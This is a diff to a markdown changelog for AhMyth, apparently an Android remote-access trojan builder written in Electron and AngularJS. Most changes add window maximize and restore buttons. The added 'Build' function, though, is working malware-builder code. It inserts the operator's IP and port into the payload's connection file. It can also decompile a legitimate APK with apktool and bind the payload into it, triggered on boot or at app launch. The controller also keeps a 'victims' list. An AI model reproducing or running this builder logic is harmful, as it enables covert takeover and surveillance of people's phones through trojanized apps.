@@ -1,3 +1,59 @@
+## Updated App Controler for the `AppCtrl.js` file containing fixed maximize/restore button code
+```javascript
+app.controller("AppCtrl", ($scope) => {
+  $appCtrl = $scope;
+  $appCtrl.victims = viclist;
+  $appCtrl.isVictimSelected = true;
+  $appCtrl.bindApk = {
+    enable: false, method: 'BOOT'
+  }; //default values for binding apk
+
+  var log = document.getElementById("log");
+
+  $appCtrl.logs = [];
+
+  $('.menu .item')
+    .tab();
+  $('.ui.dropdown')
+    .dropdown();
+
+  const window = remote.getCurrentWindow();
+  $appCtrl.close = () => {
+    window.close();
+  };
+
+  $appCtrl.minimize = () => {
+    window.minimize();
+  };
+
+  $appCtrl.maximize = () => {
+    if (window.isMaximized()) {
+      window.unmaximize(); // Restore the window size
+    } else {
+      window.maximize(); // Maximize the window
+    }
+  };
+```
+## Updated App Controler for the `LabCtrl.js` file containing new maximize/restore button code
+```javascript
+app.controller("LabCtrl", function ($scope, $rootScope, $location) {
+    $labCtrl = $scope;
+    var log = document.getElementById("logy");
+    $labCtrl.logs = [];
+
+    const window = remote.getCurrentWindow();
+    $labCtrl.close = () => {
+        window.close();
+    };
+
+    $labCtrl.maximize = () => {
+        if (window.isMaximized()) {
+            window.unmaximize(); // Restore the window size
+        } else {
+            window.maximize(); // Maximize the window
+        }
+    };
+```
 ## `clearLogs` function for the `AppCtrl.js` file as well as the 2 of the `*.html` files below
 ```javascript
   // function to clear the logs each time a button is clicked,
@@ -146,7 +202,7 @@
 
 </html>
 ```
-## Updated `lab.html` file with correct log screen height
+## Updated `lab.html` file with correct log screen height & maximize/restore button
 ```html
 <!DOCTYPE html>
 <html ng-app="myappy">
@@ -198,6 +254,7 @@
                     <a class="item">
                         <img src="assets/img/icon.png" /> </a>
                     <div class="right  menu notDraggable">
+                        <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
                         <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
                     </div>
                 </div>
@@ -258,7 +315,7 @@
 </html>
 ```
 ## Updated `build.html` file with `clearLogs()` function
-```javascript
+```html
 <div class="ui segment h100">
 
     <table class="ui very compact table">
@@ -386,7 +443,7 @@
 </div>
 ```
 ## Updated 'Constants.js' File
-```js
+```javascript
 var path = require("path");
 
 
@@ -459,6 +516,98 @@ exports.orders = {
     contacts: 'x0000cn',
 
 }
+```
+## Updated Build function
+```javascript
+  $appCtrl.Build = (ip, port) => {
+    if (!ip) {
+      $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
+      return;
+    }
+    
+    if (!port) {
+      port = CONSTANTS.defaultPort;
+    }
+    
+    if (port > 65535 || port <= 1024) {
+      $appCtrl.Log('[x] ' + 'Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
+      return;
+    }
+
+    /*if (!$appCtrl.bindApk.enable) {
+      var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+    }*/
+
+    /* Opens the ahmyth payload source file and modifiies the ip and port to the users' ones for a bound payload. */
+    /*if ($appCtrl.bindApk.enable) {
+      var ipPortFile = dir.join(CONSTANTS.vaultFolderPath, CONSTANTS.IOSocketPath);
+    }*/
+
+    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+    delayedLog('[★] ' + 'Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
+    fs.readFile(ipPortFile, 'utf8', (error, data) => {
+      if (error) {
+        $appCtrl.Log('[x] ' + 'Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
+        WriteErrorLog(error, 'IP-PORT.log')
+        $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+        $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+        return;
+      }
+
+      // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
+      var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
+      delayedLog('[★] ' + 'Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');
+
+      var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
+      fs.writeFile(ipPortFile, result, 'utf8', (error) => {
+        if (error) {
+          $appCtrl.Log('[x] ' + 'Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
+          WriteErrorLog(error, 'IP-PORT.log')
+          $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+          return;
+        }
+
+        // check if bind apk is enabled
+        if (!$appCtrl.bindApk.enable) {
+          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+        } else {
+          // generate a solid ahmyth apk
+          var filePath = $appCtrl.filePath;
+          if (filePath == null) {
+            $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
+            return;
+          } else if (!filePath.includes(".apk")) {
+            $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
+            return;
+          }
+
+
+          var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
+          delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");
+
+          var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
+            (error, stdout, stderr) => {
+              if (error !== null) {
+                $appCtrl.Log('[x] ' + 'Decompiling Failed!', CONSTANTS.logStatus.FAIL);
+                WriteErrorLog(error, 'Decompiling.log')
+                $appCtrl.Log('[¡] ' + 'Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
+                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+                return;
+              }
+
+              if ($appCtrl.bindApk.method == 'BOOT')
+                $appCtrl.BindOnBoot(apkFolder);
+
+              else if ($appCtrl.bindApk.method == 'ACTIVITY')
+                $appCtrl.BindOnLauncher(apkFolder);
+
+
+            });
+        }
+      });
+    });
+  }
 ```
 ## new `CopyAhmythFilesAndGenerateApk` function
 > contains new smali payload directory creator function
